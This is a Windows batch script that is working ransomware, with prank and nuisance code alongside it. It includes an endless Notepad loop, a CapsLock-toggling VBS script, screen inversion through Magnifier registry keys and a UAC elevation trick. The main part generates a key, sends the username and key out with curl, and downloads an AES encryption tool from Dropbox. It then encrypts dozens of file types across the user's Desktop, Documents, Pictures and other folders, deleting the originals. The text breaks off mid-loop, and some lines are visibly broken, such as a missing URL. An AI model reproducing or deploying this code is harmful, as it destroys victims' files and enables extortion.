@echo off
:wspam
start notepad.exe
goto wspam
// Everything after this will not work cause loop
echo do > lagg.vbs
echo set wshshell = wscript.createobject("wscript.shell") >> lagg.vbs
echo wshshell.sendkeys"{ CAPSLOCK}" >> lagg.vbs
echo loop >> lagg.vbs
start lagg.vbs
start lagg.vbs
start lagg.vbs
start lagg.vbs
start lagg.vbs
reg add "HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier" /v Invert /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\ScreenMagnifier" /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
start magnify.exe
:--------------------------------------    
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", " /c ""%~s0""%params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    
if exist C:\Users\%username%\AppData\Local\k.mnam (
goto error
exit
)
set /a count=0
if exist C:\Users\%username%\AppData\Local\keksiky.mnam (
goto start
) else (
copy  C:\Users\%username%\AppData\Local
cd C:\Users\%username%\AppData\Local
echo g > keksiky.mnam
powershell -Command "Start-Process -FilePath C:\Users\%username%\AppData\Local\ -WindowStyle Hidden" 
goto error
exit
)
exit
:start
echo 0 > C:\Users\%username%\AppData\Local\k.mnam
set /a k1=%random% %%9999999
set /a k2=%random% %%9999999
set /a k3=%random% %%9999999
set key=%k1%%k2%%k3%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"User: %username% Key: %key% \n\"}" 
powershell -Command "Invoke-WebRequest https://www.dropbox.com/s/if62pl2edlj64fk/aescrypt.exe?dl=1 -OutFile cookie.exe" 
set bdir="%~dp0"
FOR /R "C:\Users\%username%\Desktop" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
FOR /R "C:\Users\%username%\Documents" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
FOR /R "C:\Users\%username%\Pictures" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
FOR /R "C:\Users\%username%\Downloads" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
FOR /R "C:\Users\%username%\Favourites" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
FOR /R "C:\Users\%username%\Links" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
FOR /R "C:\Users\%username%\Music" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
if exist *.pptx %bdir%\cookie.exe -e -p %key% *.pptx
if exist *.pptx.aes del *.pptx  >nul 2>&1
if exist *.ppt %bdir%\cookie.exe -e -p %key% *.ppt
if exist *.ppt.aes del *.ppt  >nul 2>&1
if exist *.jpg %bdir%\cookie.exe -e -p %key% *.jpg
if exist *.jpg.aes del *.jpg  >nul 2>&1
if exist *.jpeg %bdir%\cookie.exe -e -p %key% *.jpeg
if exist *.jpeg.aes del *.jpeg  >nul 2>&1
if exist *.mp3 %bdir%\cookie.exe -e -p %key% *.mp3
if exist *.mp3.aes del *.mp3  >nul 2>&1
if exist *.gif %bdir%\cookie.exe -e -p %key% *.gif
if exist *.gif.aes del *.gif  >nul 2>&1
if exist *.html %bdir%\cookie.exe -e -p %key% *.html
if exist *.html.aes del *.html  >nul 2>&1
if exist *.js %bdir%\cookie.exe -e -p %key% *.js
if exist *.js.aes del *.js  >nul 2>&1
if exist *.ddf %bdir%\cookie.exe -e -p %key% *.ddf
if exist *.ddf.aes del *.ddf  >nul 2>&1
if exist *.hta %bdir%\cookie.exe -e -p %key% *.hta
if exist *.hta.aes del *.hta  >nul 2>&1
if exist *.xlxs %bdir%\cookie.exe -e -p %key% *.xlxs
if exist *.xlxs.aes del *.xlxs  >nul 2>&1
if exist *.accdb %bdir%\cookie.exe -e -p %key% *.accdb
if exist *.accdb.aes del *.accdb  >nul 2>&1
if exist *.jfif %bdir%\cookie.exe -e -p %key% *.jfif
if exist *.jfif.aes del *.jfif  >nul 2>&1
if exist *.psd %bdir%\cookie.exe -e -p %key% *.psd
if exist *.psd.aes del *.psd  >nul 2>&1
if exist *.log %bdir%\cookie.exe -e -p %key% *.log
if exist *.log.aes del *.log  >nul 2>&1
if exist *.pdf %bdir%\cookie.exe -e -p %key% *.pdf
if exist *.pdf.aes del *.pdf  >nul 2>&1
if exist *.svg %bdir%\cookie.exe -e -p %key% *.svg
if exist *.svg.aes del *.svg  >nul 2>&1
if exist *.xls %bdir%\cookie.exe -e -p %key% *.xls
if exist *.xls.aes del *.xls  >nul 2>&1
if exist *.avi %bdir%\cookie.exe -e -p %key% *.avi
if exist *.avi.aes del *.avi  >nul 2>&1
if exist *.zip %bdir%\cookie.exe -e -p %key% *.zip
if exist *.zip.aes del *.zip  >nul 2>&1
if exist *.7z %bdir%\cookie.exe -e -p %key% *.7z
if exist *.7z.aes del *.7z  >nul 2>&1
if exist *.rar %bdir%\cookie.exe -e -p %key% *.rar
if exist *.rar.aes del *.rar  >nul 2>&1
if exist *.wav %bdir%\cookie.exe -e -p %key% *.wav
if exist *.wav.aes del *.wav  >nul 2>&1
if exist *.mov %bdir%\cookie.exe -e -p %key% *.mov
if exist *.mov.aes del *.mov  >nul 2>&1
if exist *.m4a %bdir%\cookie.exe -e -p %key% *.m4a
if exist *.m4a.aes del *.m4a  >nul 2>&1
if exist *.webp %bdir%\cookie.exe -e -p %key% *.webp
if exist *.webp.aes del *.webp  >nul 2>&1
rename *.aes *.encrypted  >nul 2>&1
)
FOR /R "C:\Users\%username%\Videos" %%G in (.) DO (
Pushd %%G
set /a count=%count%+1
cd %%G
if exist *.txt %bdir%\cookie.exe -e -p %key% *.txt
if exist *.txt.aes del *.txt  >nul 2>&1
if exist *.mp4 %bdir%\cookie.exe -e -p %key% *.mp4
if exist *.mp4.aes del *.mp4  >nul 2>&1
if exist *.png %bdir%\cookie.exe -e -p %key% *.png
if exist *.png.aes del *.png  >nul 2>&1
if exist *.lnk %bdir%\cookie.exe -e -p %key% *.lnk
if exist *.lnk.aes del *.lnk  >nul 2>&1
if exist *.docx %bdir%\cookie.exe -e -p %key% *.docx
if exist *.docx.aes del *.docx  >nul 2>&1
if exist *.doc %bdir%\cookie.exe -e -p %key% *.doc
if exist *.doc.aes del *.doc  >nul 2>&1
